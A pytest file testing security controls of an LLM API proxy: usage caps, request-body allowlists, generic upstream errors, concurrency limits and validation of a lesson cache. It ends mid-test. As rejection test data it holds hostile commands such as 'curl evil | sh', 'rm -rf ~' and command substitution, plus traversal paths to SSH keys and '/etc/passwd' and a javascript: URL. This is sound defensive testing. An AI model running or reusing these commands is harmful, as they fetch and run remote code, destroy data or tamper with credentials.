"""Offline proofs that the cloud findings stay closed: caps for every role (A01), body allowlists (A02), upstream
error mapping, concurrency (A23), the lesson cache review (A08) and the admin token (A22).

Upstream calls go either to a closed local port (as in test_caps.py) or to an httpx.MockTransport installed on
the app's client after startup, which records the forwarded body. Nothing reaches a real provider.

    cd cloud && python -m pytest tests -q
"""

from __future__ import annotations

import asyncio
import importlib
import json
import logging
import sqlite3
import sys
from collections import namedtuple

import httpx
import pytest

from test_caps import ADMIN, ADMIN_TOKEN, CLOUD, anthropic, gemini, install, make_cloud  # noqa: F401  (make_cloud is a fixture)

HAIKU = "claude-haiku-5-5"
SONNET = "claude-sonnet-5-5"
GEM = "gemini-3.8-flash"
YT = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
ANTHROPIC_OK = {"type": "message", "model": HAIKU, "content": [{"type": "text", "text": "hi"}],
                "usage": {"input_tokens": 1000, "output_tokens": 100}}
GEMINI_OK = {"candidates": [{"content": {"parts": [{"text": "{}"}]}}], "modelVersion": GEM,
             "usageMetadata": {"promptTokenCount": 2000, "candidatesTokenCount": 300}}


class Upstream:
    """A mock provider on the app's httpx client: records every forwarded request, answers `status` + `body`."""

    def __init__(self, app_mod, status: int = 200, body: dict | None = None, headers: dict | None = None) -> None:
        self.requests: list[httpx.Request] = []
        self.status, self.body, self.headers = status, body, headers or {}
        app_mod.http = httpx.AsyncClient(transport=httpx.MockTransport(self.handle))

    def handle(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        body = self.body if self.body is not None else (GEMINI_OK if "gemini" in str(request.url) or ":generate" in str(request.url) else ANTHROPIC_OK)
        return httpx.Response(self.status, json=body, headers=self.headers)

    @property
    def last(self) -> dict:
        return json.loads(self.requests[-1].content)


def post_anthropic(client, h, body: dict, **headers):
    return client.post("/v1/anthropic/v1/messages", headers={**h, **headers}, json=body)


def post_gemini(client, h, body: dict, model: str = GEM):
    return client.post(f"/v1/gemini/v1beta/models/{model}:generateContent", headers=h, json=body)


def msg(text="hi"):
    return [{"role": "user", "content": text}]


# --------------------------------------------------------------------------- A01: caps for every role

def test_roleless_anonymous_calls_hit_the_daily_request_cap(make_cloud):
    client, app_mod = make_cloud(FREE_DAILY_REQUESTS="3")
    h, _ = install(client)
    assert [anthropic(client, h, role=None).status_code for _ in range(3)] == [502] * 3
    for r in (anthropic(client, h, role=None), gemini(client, h, role=None), anthropic(client, h, role="lesson"),
              anthropic(client, h, role="finder"), anthropic(client, h, role="workspace")):
        assert r.status_code == 429
        err = r.json()["error"]
        assert err["type"] == "miyagi_quota" and err["limit"] == "daily_requests" and err["cap"] == 3
        assert err["scope"] == "install" and r.headers["x-should-retry"] == "false"


def test_free_defaults_cover_a_normal_lesson(make_cloud):
    client, app_mod = make_cloud(unset=("FREE_DAILY_REQUESTS", "FREE_DAILY_USD", "LINKED_DAILY_REQUESTS",
                                        "LINKED_DAILY_USD", "DAILY_USD_CAP"))
    assert app_mod.FREE_DAILY_REQUESTS == 300 and app_mod.FREE_DAILY_USD == 1.0
    assert app_mod.LINKED_DAILY_REQUESTS == 1000 and app_mod.LINKED_DAILY_USD == 3.0
    assert app_mod.DAILY_USD_CAP == 25.0 and app_mod.FREE_COACH_CALLS_PER_DAY == 60


def test_per_install_usd_cap(make_cloud):
    client, app_mod = make_cloud(FREE_DAILY_USD="0.05")
    h, _ = install(client)
    th = app_mod.hash_token(h["Authorization"][7:])
    app_mod.store.add_tokens(th, "anthropic", HAIKU, 10, 10, 0.05)
    r = anthropic(client, h, role=None)
    assert r.status_code == 429
    err = r.json()["error"]
    assert err["type"] == "miyagi_quota" and err["limit"] == "daily_spend" and err["cap"] == 0.05 and err["scope"] == "install"
    other, _ = install(client)
    assert anthropic(client, other, role=None).status_code == 502  # per install


def test_linked_caps_count_every_install_of_the_user(make_cloud):
    client, app_mod = make_cloud(LINKED_DAILY_REQUESTS="3", FREE_DAILY_REQUESTS="100")
    a, _ = install(client)
    b, _ = install(client)
    loner, _ = install(client)
    for h in (a, b):
        app_mod.store.link_user(app_mod.hash_token(h["Authorization"][7:]), "user-1")
    assert [anthropic(client, h, role=None).status_code for h in (a, b, a)] == [502] * 3
    r = anthropic(client, b, role=None)
    assert r.status_code == 429 and r.json()["error"]["limit"] == "daily_requests" and r.json()["error"]["scope"] == "account"
    assert anthropic(client, loner, role=None).status_code == 502  # unlinked: its own anonymous cap


def test_pro_skips_per_install_caps_but_not_the_kill_switch(make_cloud):
    client, app_mod = make_cloud(FREE_DAILY_REQUESTS="1", FREE_DAILY_USD="0.01", DAILY_USD_CAP="5")
    h, token_id = install(client)
    assert client.post(f"/admin/tokens/{token_id}/plan", json={"plan": "pro"}, headers=ADMIN).status_code == 200
    assert [anthropic(client, h, role=None).status_code for _ in range(3)] == [502] * 3
    app_mod.store.add_tokens(app_mod.hash_token(h["Authorization"][7:]), "anthropic", HAIKU, 1, 1, 5.0)
    assert anthropic(client, h).json()["error"]["limit"] == "daily_usd"


def test_reservations_stop_parallel_calls_overshooting(make_cloud):
    _, app_mod = make_cloud()
    s, th = app_mod.store, "f" * 64
    reserve = 4096 * app_mod.output_price(SONNET)  # max_tokens x output price: about $0.04
    results = [s.admit_call(th, "anthropic", SONNET, None, {}, 0, usd_cap=0.1, reserve_usd=reserve) for _ in range(3)]
    assert [r[0] for r in results] == [None, None, "usd"]  # the third would pass $0.10 with the two in flight
    day = app_mod.today()
    s.settle(th, "anthropic", SONNET, day, reserve, SONNET, 1000, 100, 0.003)  # the first call cost $0.003
    assert s.admit_call(th, "anthropic", SONNET, None, {}, 0, usd_cap=0.1, reserve_usd=reserve)[0] is None
    # the global kill switch counts reservations too
    assert s.admit_call("e" * 64, "anthropic", SONNET, None, {}, 0, global_usd_cap=0.1, reserve_usd=reserve)[0] == "global_usd"


def test_reservation_is_settled_to_the_real_cost(make_cloud):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    th = app_mod.hash_token(h["Authorization"][7:])
    r = post_anthropic(client, h, {"model": HAIKU, "max_tokens": 4000, "messages": msg()})
    assert r.status_code == 200 and len(up.requests) == 1
    assert app_mod.store.usd_today_for(th) == pytest.approx(app_mod.estimate_usd(HAIKU, 1000, 100))
    up.status, up.body = 500, {"type": "error", "error": {"type": "api_error", "message": "x"}}
    post_anthropic(client, h, {"model": HAIKU, "max_tokens": 4000, "messages": msg()})
    assert app_mod.store.usd_today_for(th) == pytest.approx(app_mod.estimate_usd(HAIKU, 1000, 100))  # failed: no cost


# --------------------------------------------------------------------------- A02: Anthropic body allowlist

def test_anthropic_forwards_only_allowlisted_keys(make_cloud):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    schema = {"type": "object", "properties": {"a": {"type": "string"}}, "required": ["a"], "additionalProperties": False}
    body = {"model": SONNET, "max_tokens": 99999, "messages": [{"role": "user", "content": [
                {"type": "text", "text": "look", "cache_control": {"type": "ephemeral"}},
                {"type": "image", "source": {"type": "base64", "media_type": "image/jpeg", "data": "AAAA"}}], "extra": 1}],
            "system": [{"type": "text", "text": "sys", "cache_control": {"type": "ephemeral"}}],
            "temperature": 0.2, "stop_sequences": ["END"], "stream": False,
            "thinking": {"type": "adaptive", "display": "omitted"},
            "output_config": {"effort": "low", "format": {"type": "json_schema", "schema": schema}, "task_budget": {"total": 1}},
            "tools": [{"name": "pick", "description": "d", "input_schema": schema, "eager_input_streaming": True}],
            "tool_choice": {"type": "auto"}, "fallbacks": "default",
            "metadata": {"user_id": "x"}, "inference_geo": "us", "betas": ["x"], "anything_else": {"deep": True}}
    r = post_anthropic(client, h, body, **{"anthropic-beta": "server-side-fallback-2026-07-01", "x-miyagi-role": "coach"})
    assert r.status_code == 200, r.text
    sent = up.last
    assert sent == {
        "model": SONNET, "max_tokens": 4096,
        "messages": [{"role": "user", "content": body["messages"][0]["content"]}],
        "system": body["system"], "temperature": 0.2, "stop_sequences": ["END"], "stream": False,
        "thinking": {"type": "adaptive", "display": "omitted"},
        "output_config": {"effort": "low", "format": {"type": "json_schema", "schema": schema}},
        "tools": [{"name": "pick", "description": "d", "input_schema": schema}],
        "tool_choice": {"type": "auto"}, "fallbacks": "default",
    }
    hdrs = up.requests[-1].headers
    assert hdrs["anthropic-beta"] == "server-side-fallback-2026-07-01" and hdrs["x-api-key"] == "fake-upstream-key"
    assert "x-miyagi-role" not in hdrs and "authorization" not in hdrs


@pytest.mark.parametrize("patch, needle", [
    ({"tools": [{"type": "web_search_20260209", "name": "web_search", "max_uses": 5}]}, "Tool type"),
    ({"tools": [{"type": "web_fetch_20260209", "name": "web_fetch"}]}, "Tool type"),
    ({"tools": [{"type": "code_execution_20260521", "name": "code_execution"}]}, "Tool type"),
    ({"tools": [{"type": "bash_20250124", "name": "bash"}]}, "Tool type"),
    ({"tools": [{"type": "computer_toolset_20260801", "name": "computer"}]}, "Tool type"),
    ({"tools": [{"type": "text_editor_20250728", "name": "str_replace_based_edit_tool"}]}, "Tool type"),
    ({"tools": [{"type": "memory_20250818", "name": "memory"}]}, "Tool type"),
    ({"tools": [{"type": "mcp_toolset", "mcp_server_name": "x"}]}, "Tool type"),
    ({"mcp_servers": [{"type": "url", "url": "https://evil.example/mcp", "name": "x"}]}, "mcp_servers"),
    ({"container": {"skills": []}}, "container"),
    ({"service_tier": "priority"}, "service_tier"),
    ({"context_management": {"edits": []}}, "context_management"),
    ({"messages": [{"role": "user", "content": [{"type": "image", "source": {"type": "url", "url": "https://evil.example/a.png"}}]}]}, "url sources"),
    ({"messages": [{"role": "user", "content": [{"type": "document", "source": {"type": "file", "file_id": "file_1"}}]}]}, "file sources"),
    ({"messages": [{"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t", "content": [
        {"type": "document", "source": {"type": "url", "url": "https://evil.example/a.pdf"}}]}]}]}, "url sources"),
    ({"system": [{"type": "document", "source": {"type": "url", "url": "https://evil.example/a.pdf"}}]}, "url sources"),
    ({"model": "claude-opus-5-5"}, "Model not allowed"),
    ({"fallbacks": [{"model": "claude-opus-5-5"}]}, "Opus"),
    ({"fallbacks": [{"model": "claude-sonnet-4-6"}]}, "fallbacks"),
    ({"tools": [{"type": "advisor_20260301", "name": "advisor", "model": "claude-opus-5-5"}]}, "Opus"),
    ({"fallback_model": "claude-opus-5"}, "Opus"),
    ({"fallback_model": "claude-sonnet-4-6"}, "allowed model"),
    ({"speed": "fast"}, "fast"),
    ({"thinking": {"type": "enabled", "budget_tokens": 50}}, "budget_tokens"),  # max_tokens is 10 here
    ({"thinking": {"type": "enabled", "budget_tokens": 9000}, "max_tokens": 99999}, "budget_tokens"),
])
def test_anthropic_refuses_dangerous_fields(make_cloud, patch, needle):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    th = app_mod.hash_token(h["Authorization"][7:])
    r = post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg(), **patch})
    assert r.status_code == 400, r.text
    assert r.json()["error"]["type"] == "invalid_request_error" and needle in r.json()["error"]["message"]
    assert up.requests == [] and app_mod.store.requests_today(th) == 0  # never forwarded, never counted
    assert app_mod.inflight.total == 0


def test_anthropic_refuses_unknown_betas(make_cloud):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    for beta in ("mcp-client-2025-11-20", "server-side-fallback-2026-07-01,code-execution-2025-08-25", "files-api-2025-04-14"):
        r = post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg()}, **{"anthropic-beta": beta})
        assert r.status_code == 400 and "anthropic-beta" in r.json()["error"]["message"]
    assert up.requests == []


def test_web_tools_only_when_allowlisted_and_counted(make_cloud):
    client, app_mod = make_cloud(ANTHROPIC_SERVER_TOOLS="web_search", SERVER_TOOL_MAX_USES="3", FREE_DAILY_USD="5")
    up = Upstream(app_mod, body={**ANTHROPIC_OK, "usage": {"input_tokens": 10, "output_tokens": 10,
                                                           "server_tool_use": {"web_search_requests": 2}}})
    h, _ = install(client)
    tool = {"type": "web_search_20250305", "name": "web_search", "max_uses": 50, "allowed_domains": ["youtube.com"]}
    r = post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg(), "tools": [tool]})
    assert r.status_code == 200
    assert up.last["tools"] == [{"type": "web_search_20250305", "name": "web_search", "max_uses": 3, "allowed_domains": ["youtube.com"]}]
    th = app_mod.hash_token(h["Authorization"][7:])
    assert app_mod.store.usd_today_for(th) == pytest.approx(app_mod.estimate_usd(HAIKU, 10, 10) + 2 * 0.01)
    fetch = {"type": "web_fetch_20260209", "name": "web_fetch"}
    assert post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg(), "tools": [fetch]}).status_code == 400


def test_server_tool_usage_counted_defensively(make_cloud):
    _, app_mod = make_cloud()
    u = app_mod.Usage()
    u.feed(b'{"usage": {"input_tokens": 0, "output_tokens": 0, "server_tool_use": {"web_search_requests": 3, '
           b'"web_fetch_requests": 1, "code_execution_requests": 1}}}')

    class R:
        state = type("S", (), {})()
    assert u.totals(R(), "anthropic", HAIKU)[3] == pytest.approx(0.05)


# --------------------------------------------------------------------------- A02: Gemini body allowlist

def gem_body(**over):
    body = {"contents": [{"role": "user", "parts": [{"fileData": {"fileUri": YT}, "videoMetadata": {"fps": 0.5}},
                                                    {"text": "watch"}]}],
            "systemInstruction": {"parts": [{"text": "sys"}]},
            "generationConfig": {"responseMimeType": "application/json", "responseJsonSchema": {"type": "object"},
                                 "temperature": 0.2, "mediaResolution": "MEDIA_RESOLUTION_LOW"}}
    body.update(over)
    return body


def test_gemini_clamps_and_forwards_only_allowlisted_keys(make_cloud):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    body = gem_body(labels={"a": "b"}, generationConfig={
        **gem_body()["generationConfig"], "maxOutputTokens": 65536, "candidateCount": 4, "responseModalities": ["AUDIO"],
        "thinkingConfig": {"thinkingBudget": 24576, "includeThoughts": False}})
    r = post_gemini(client, h, body)
    assert r.status_code == 200, r.text
    sent = up.last
    assert set(sent) == {"contents", "systemInstruction", "generationConfig"}
    gc = sent["generationConfig"]
    assert gc["maxOutputTokens"] == 8192 and gc["thinkingConfig"] == {"thinkingBudget": 2048, "includeThoughts": False}
    assert gc["candidateCount"] == 1 and "responseModalities" not in gc
    assert sent["contents"][0]["parts"][0] == {"fileData": {"fileUri": YT}, "videoMetadata": {"fps": 0.5}}
    # no maxOutputTokens at all: the clamp is sent, so the cost is bounded
    post_gemini(client, h, gem_body())
    assert up.last["generationConfig"]["maxOutputTokens"] == 8192
    assert app_mod.GEMINI_MAX_OUTPUT_TOKENS == 8192 and app_mod.GEMINI_MAX_THINKING_TOKENS == 2048
    assert app_mod.MAX_GEMINI_BODY == 8 * 1024 * 1024


@pytest.mark.parametrize("uri", [YT, "https://youtu.be/dQw4w9WgXcQ", "https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=42s"])
def test_gemini_youtube_file_uri_allowed(make_cloud, uri):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    body = gem_body(contents=[{"role": "user", "parts": [{"fileData": {"fileUri": uri, "mimeType": "video/*"}}]}])
    assert post_gemini(client, h, body).status_code == 200
    assert up.last["contents"][0]["parts"][0]["fileData"] == {"fileUri": YT, "mimeType": "video/*"}


@pytest.mark.parametrize("patch, needle", [
    ({"tools": [{"googleSearch": {}}]}, "functionDeclarations"),
    ({"tools": [{"codeExecution": {}}]}, "functionDeclarations"),
    ({"tools": [{"urlContext": {}}]}, "functionDeclarations"),
    ({"tools": [{"functionDeclarations": [], "googleSearchRetrieval": {}}]}, "functionDeclarations"),
    ({"cachedContent": "cachedContents/abc"}, "cachedContent"),
    ({"contents": [{"parts": [{"fileData": {"fileUri": "https://evil.example/video.mp4"}}]}]}, "YouTube"),
    ({"contents": [{"parts": [{"fileData": {"fileUri": "gs://bucket/secret.mp4"}}]}]}, "YouTube"),
    ({"contents": [{"parts": [{"fileData": {"fileUri": "https://generativelanguage.googleapis.com/v1beta/files/abc"}}]}]}, "YouTube"),
    ({"contents": [{"parts": [{"fileData": {"fileUri": "https://www.youtube.com.evil.example/watch?v=dQw4w9WgXcQ"}}]}]}, "YouTube"),
    ({"contents": [{"parts": [{"fileData": {"fileUri": "http://www.youtube.com/watch?v=dQw4w9WgXcQ"}}]}]}, "YouTube"),
    ({"systemInstruction": {"parts": [{"fileData": {"fileUri": "https://evil.example/x"}}]}}, "YouTube"),
])
def test_gemini_refuses_dangerous_fields(make_cloud, patch, needle):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    r = post_gemini(client, h, gem_body(**patch))
    assert r.status_code == 400 and needle in r.json()["error"]["message"], r.text
    assert up.requests == [] and app_mod.inflight.total == 0


def test_gemini_snake_case_cached_content_refused(make_cloud):
    client, app_mod = make_cloud()
    Upstream(app_mod)
    h, _ = install(client)
    assert post_gemini(client, h, gem_body(cached_content="cachedContents/x")).status_code == 400


# --------------------------------------------------------------------------- upstream errors

SECRET_UPSTREAM_TEXT = "org-7f3a internal: workspace wrk_42 limit 4000000 tokens/min, contact sales"


@pytest.mark.parametrize("status, body, want_status, want_type", [
    (429, {"type": "error", "error": {"type": "rate_limit_error", "message": SECRET_UPSTREAM_TEXT}}, 429, "rate_limit_error"),
    (529, {"type": "error", "error": {"type": "overloaded_error", "message": SECRET_UPSTREAM_TEXT}}, 529, "overloaded_error"),
    (402, {"type": "error", "error": {"type": "billing_error", "message": SECRET_UPSTREAM_TEXT}}, 503, "upstream_unavailable"),
    (400, {"type": "error", "error": {"type": "invalid_request_error",
                                      "message": "Your credit balance is too low. " + SECRET_UPSTREAM_TEXT}}, 503, "upstream_unavailable"),
    (401, {"type": "error", "error": {"type": "authentication_error", "message": SECRET_UPSTREAM_TEXT}}, 502, "upstream_auth_error"),
    (403, {"type": "error", "error": {"type": "permission_error", "message": SECRET_UPSTREAM_TEXT}}, 502, "upstream_auth_error"),
])
def test_anthropic_upstream_errors_are_generic(make_cloud, caplog, status, body, want_status, want_type):
    client, app_mod = make_cloud()
    Upstream(app_mod, status=status, body=body, headers={"retry-after": "7", "anthropic-organization-id": "org-7f3a"})
    h, _ = install(client)
    with caplog.at_level(logging.WARNING, logger="miyagi.cloud"):
        r = post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg()})
    assert r.status_code == want_status and r.json()["error"]["type"] == want_type
    assert "org-7f3a" not in r.text and "wrk_42" not in r.text and "org-7f3a" not in str(r.headers)
    assert "wrk_42" in caplog.text  # the operators still see what the provider said
    if status == 429:
        assert r.headers["retry-after"] == "7"
        assert "code" not in r.json()["error"]  # the provider's shape: the engine retries it, never "today's limit"


@pytest.mark.parametrize("status, want_status", [(429, 429), (503, 503), (500, 500)])
def test_gemini_upstream_errors_are_generic(make_cloud, status, want_status):
    client, app_mod = make_cloud()
    Upstream(app_mod, status=status, body={"error": {"code": status, "message": SECRET_UPSTREAM_TEXT, "status": "X"}})
    h, _ = install(client)
    r = post_gemini(client, h, gem_body())
    assert r.status_code == want_status and "wrk_42" not in r.text
    assert r.json()["error"]["code"] == want_status and "message" in r.json()["error"]


def test_plain_request_errors_still_pass_through(make_cloud):
    client, app_mod = make_cloud()
    Upstream(app_mod, status=400, body={"type": "error", "error": {"type": "invalid_request_error", "message": "messages: empty"}})
    h, _ = install(client)
    r = post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg()})
    assert r.status_code == 400 and r.json()["error"]["message"] == "messages: empty"


# --------------------------------------------------------------------------- A23: calls in flight

class HeldStream(httpx.AsyncByteStream):
    """An SSE body that sends one event, then waits for `gate` before the final usage."""

    def __init__(self, gate: asyncio.Event) -> None:
        self.gate = gate

    async def __aiter__(self):
        yield b'event: message_start\ndata: {"type":"message_start","message":{"model":"claude-haiku-5-5"}}\n\n'
        await self.gate.wait()
        yield b'event: message_delta\ndata: {"type":"message_delta","usage":{"input_tokens":100,"output_tokens":20}}\n\n'


async def _asgi(app, path: str, headers: dict, body: dict, disconnect: asyncio.Event):
    """One raw ASGI request; the client disconnects when `disconnect` is set. Returns (status, body bytes)."""
    raw = json.dumps(body).encode()
    sent: list[dict] = []
    first = [True]

    async def receive():
        if first[0]:
            first[0] = False
            return {"type": "http.request", "body": raw, "more_body": False}
        await disconnect.wait()
        return {"type": "http.disconnect"}

    async def send(m):
        sent.append(m)

    hs = [(k.lower().encode(), v.encode()) for k, v in {**headers, "content-type": "application/json",
                                                         "content-length": str(len(raw))}.items()]
    scope = {"type": "http", "asgi": {"version": "3.0"}, "http_version": "1.1", "method": "POST", "scheme": "http",
             "path": path, "raw_path": path.encode(), "query_string": b"", "root_path": "", "headers": hs,
             "client": ("127.0.0.1", 40000), "server": ("testserver", 80)}
    await app(scope, receive, send)
    status = next(m["status"] for m in sent if m["type"] == "http.response.start")
    return status, b"".join(m.get("body", b"") for m in sent if m["type"] == "http.response.body")


def test_fifth_concurrent_call_is_429_and_slots_come_back(make_cloud):
    client, app_mod = make_cloud(FREE_DAILY_USD="5")
    a, _ = install(client)
    b, _ = install(client)
    tha = app_mod.hash_token(a["Authorization"][7:])
    assert app_mod.PER_TOKEN_INFLIGHT == 4 and app_mod.GLOBAL_INFLIGHT == 80

    async def scenario():
        gate = asyncio.Event()
        calls = []

        async def handler(request):
            calls.append(request)
            if not json.loads(request.content).get("stream"):
                return httpx.Response(200, json=ANTHROPIC_OK)
            return httpx.Response(200, stream=HeldStream(gate), headers={"content-type": "text/event-stream"})

        app_mod.http = httpx.AsyncClient(transport=httpx.MockTransport(handler))
        stream_body = {"model": HAIKU, "max_tokens": 1000, "messages": msg(), "stream": True}
        path = "/v1/anthropic/v1/messages"
        hangups = [asyncio.Event() for _ in range(4)]
        tasks = [asyncio.create_task(_asgi(app_mod.app, path, a, stream_body, hangups[i])) for i in range(4)]
        for _ in range(200):
            if len(calls) == 4:
                break
            await asyncio.sleep(0.01)
        assert len(calls) == 4 and app_mod.inflight.per[tha] == 4
        # the fifth concurrent call from the same install is refused before its body is read
        status, raw = await _asgi(app_mod.app, path, a, {"model": HAIKU, "max_tokens": 10, "messages": msg()}, asyncio.Event())
        err = json.loads(raw)["error"]
        assert status == 429 and err["limit"] == "inflight_token" and err["type"] == "concurrency_limit_error"
        assert len(calls) == 4
        # another install is not blocked by it
        status, _ = await _asgi(app_mod.app, path, b, {**stream_body, "stream": False}, asyncio.Event())
        assert status == 200
        # two clients hang up mid-stream, two streams finish normally
        hangups[0].set()
        hangups[1].set()
        await asyncio.sleep(0.05)
        gate.set()
        results = await asyncio.wait_for(asyncio.gather(*tasks), 5)
        assert [s for s, _ in results] == [200] * 4
        assert b"message_delta" in results[2][1] and b"message_delta" in results[3][1]
        await app_mod.http.aclose()

    asyncio.run(scenario())
    assert app_mod.inflight.total == 0 and app_mod.inflight.per == {}
    # every reservation was settled: two finished streams at their real cost, two hung-up ones at what they used
    assert app_mod.store.usd_today_for(tha) == pytest.approx(2 * app_mod.estimate_usd(HAIKU, 100, 20))
    assert app_mod.store.requests_today(tha) == 4


def test_global_inflight_limit(make_cloud):
    client, app_mod = make_cloud(GLOBAL_INFLIGHT="1")
    h, _ = install(client)
    tok = app_mod.hash_token(h["Authorization"][7:])
    assert app_mod.inflight.acquire("someone-else") is None
    r = anthropic(client, h)
    assert r.status_code == 429 and r.json()["error"]["limit"] == "inflight_global" and r.headers["retry-after"] == "1"
    app_mod.inflight.release("someone-else")
    assert anthropic(client, h).status_code == 502
    assert app_mod.inflight.total == 0 and tok not in app_mod.inflight.per


def test_over_cap_call_is_refused_before_its_body_is_read(make_cloud):
    client, app_mod = make_cloud(FREE_DAILY_REQUESTS="1")
    h, _ = install(client)
    assert anthropic(client, h).status_code == 502
    r = client.post("/v1/anthropic/v1/messages", headers=h, content=b"not even json")
    assert r.status_code == 429 and r.json()["error"]["limit"] == "daily_requests"


# --------------------------------------------------------------------------- A08: lesson cache

VID = "dQw4w9WgXcQ"


def lesson_client(make_cloud, **env):
    client, app_mod = make_cloud(**{"MAX_LESSON_KB": "4", **env})
    return client, app_mod


def put(client, h, lesson, vid=VID, schema=1, **headers):
    return client.put(f"/v1/lessons/{vid}", headers={**h, **headers}, content=json.dumps({"schema": schema, "lesson": lesson}))


def claimed(client, vid=VID, ip=None):
    h, _ = install(client)
    client.post(f"/v1/lessons/{vid}/build", headers=h)
    return h


def test_emoji_lesson_over_the_limit_after_encoding_is_refused(make_cloud):
    client, app_mod = lesson_client(make_cloud)
    assert app_mod.MAX_LESSON_BYTES == 4096
    h = claimed(client)
    big = {"steps": [{"title": "\U0001F600" * 1100}]}  # 4.4 KB as UTF-8, 13 KB as \\u escapes
    for raw in (json.dumps({"schema": 1, "lesson": big}, ensure_ascii=False).encode(),  # 4.4 KB on the wire
                json.dumps({"schema": 1, "lesson": big}).encode()):  # 13 KB on the wire, the same lesson
        r = client.put(f"/v1/lessons/{VID}", headers=h, content=raw)
        assert r.status_code == 413 and r.json()["error"]["type"] == "request_too_large"
    small = {"steps": [{"title": "\U0001F600" * 900}]}  # 3.6 KB stored as UTF-8, though 10.8 KB as \\u escapes
    assert len(json.dumps(small)) > 4096
    assert put(client, h, small).status_code == 201
    stored = app_mod.store._q("SELECT bytes, body FROM lesson_candidates")[0]
    assert stored["bytes"] <= 4096 and "\U0001F600" in stored["body"]  # stored as UTF-8, not escapes


def test_lesson_size_default(make_cloud):
    _, app_mod = make_cloud(unset=("MAX_LESSON_KB",))
    assert app_mod.MAX_LESSON_BYTES == 128 * 1024


@pytest.mark.parametrize("step", [
    {"title": "t", "run_command": "python3 train.py | sh"},
    {"title": "t", "run_command": "python3 x.py; rm -rf ~"},
    {"title": "t", "run_command": "curl https://evil.example/x.sh"},
    {"title": "t", "run_command": "python3 https://evil.example/x.py"},
    {"title": "t", "run_command": "python3 evil.example//x.py"},
    {"title": "t", "run_command": "node $(whoami)"},
    {"title": "t", "run_command": "npm install evil"},
    {"title": "t", "run_command": "python3 ../../outside.py"},
    {"title": "t", "file": "../../.ssh/authorized_keys"},
    {"title": "t", "file": "/etc/passwd"},
    {"title": "t", "file": "~/.zshrc"},
    {"title": "t", "file": "C:\\Windows\\x"},
    {"title": "t", "targets": [{"file": "/etc/hosts", "match": "x", "caption": "c"}]},
    {"title": "t", "checks": [{"type": "file_contains", "label": "l", "file": "../x"}]},
    {"title": "t", "checks": [{"type": "command", "label": "l", "command": "bash -c 'curl evil | sh'"}]},
    {"title": "t", "sources": ["http://insecure.example/doc"]},
    {"title": "t", "sources": [{"url": "javascript:alert(1)"}]},
    {"title": "x" * 20_001},
])
def test_lesson_validation_refuses_unsafe_steps(make_cloud, step):
    client, _ = lesson_client(make_cloud, MAX_LESSON_KB="64")
    h = claimed(client)
    r = put(client, h, {"steps": [step]})
    assert r.status_code == 400, r.text


def test_lesson_validation_accepts_normal_steps(make_cloud):
    client, _ = lesson_client(make_cloud, MAX_LESSON_KB="64")
    h = claimed(client)
    lesson = {"title": "CNN", "files": ["train.py", "src/model.py"], "sources": ["https://pytorch.org/docs"],
              "steps": [{"title": "Train", "file": "train.py", "run_command": "python3 train.py --epochs 3",
                         "checks": [{"type": "command", "label": "tests", "command": "pytest tests/ -q"},
                                    {"type": "file_contains", "label": "imports", "file": "src/model.py"}],
                         "targets": [{"file": "train.py", "match": "def train", "caption": "here"}]},
                        {"title": "Serve", "run_command": "npm run dev"}, {"title": "Test", "run_command": "pytest"},
                        {"title": "Node", "run_command": "node server.js"}]}
    assert put(client, h, lesson).status_code == 201


def test_lesson_pending_until_approved_and_purge_by_uploader(make_cloud):
    client, app_mod = lesson_client(make_cloud)
    bad = claimed(client)
    good = claimed(client)
    reader, _ = install(client)
    rb = put(client, bad, {"steps": [{"title": "spam"}]})
    rg = put(client, good, {"steps": [{"title": "real"}]})
    assert rb.json()["status"] == rg.json()["status"] == "pending"
    assert client.get(f"/v1/lessons/{VID}?schema=1", headers=reader).status_code == 404
    approve = client.post(f"/admin/lessons/{VID}/approve", headers=ADMIN, json={"hash": rb.json()["hash"]})
    assert approve.status_code == 200
    assert client.get(f"/v1/lessons/{VID}?schema=1", headers=reader).json()["lesson"] == {"steps": [{"title": "spam"}]}
    bad_prefix = app_mod.hash_token(bad["Authorization"][7:])[:12]
    r = client.delete(f"/admin/lessons/by-uploader/{bad_prefix}", headers=ADMIN)
    assert r.json() == {"uploader": bad_prefix, "deleted": 1}
    assert client.get(f"/v1/lessons/{VID}?schema=1", headers=reader).status_code == 404
    pending = client.get("/admin/lessons/pending", headers=ADMIN).json()["pending"]
    assert [p["hash"] for p in pending] == [rg.json()["hash"]]
    assert client.delete("/admin/lessons/by-uploader/xyz", headers=ADMIN).status_code == 400
    assert client.get("/admin/lessons/pending").status_code == 401


def test_lesson_uploads_per_install_per_day(make_cloud):
    client, app_mod = lesson_client(make_cloud, LESSON_PUTS_PER_DAY="2")
    vids = ["aaaaaaaaaaa", "bbbbbbbbbbb", "ccccccccccc"]
    h, _ = install(client)
    for v in vids:
        client.post(f"/v1/lessons/{v}/build", headers=h)
    assert [put(client, h, {"steps": [{"title": "x"}]}, vid=v).status_code for v in vids[:2]] == [201, 201]
    r = put(client, h, {"steps": [{"title": "x"}]}, vid=vids[2])
    assert r.status_code == 429 and r.json()["error"]["limit"] == "lesson_uploads"
    _, app_mod = make_cloud(unset=("LESSON_PUTS_PER_DAY",))
    assert app_mod.LESSON_PUTS_PER_DAY == 10


def test_lesson_uploads_stop_when_the_disk_is_full(make_cloud, monkeypatch):
    client, app_mod = lesson_client(make_cloud)
    h = claimed(client)
    usage = namedtuple("usage", "total used free")
    monkeypatch.setattr(app_mod.shutil, "disk_usage", lambda _p: usage(100, 86, 14))
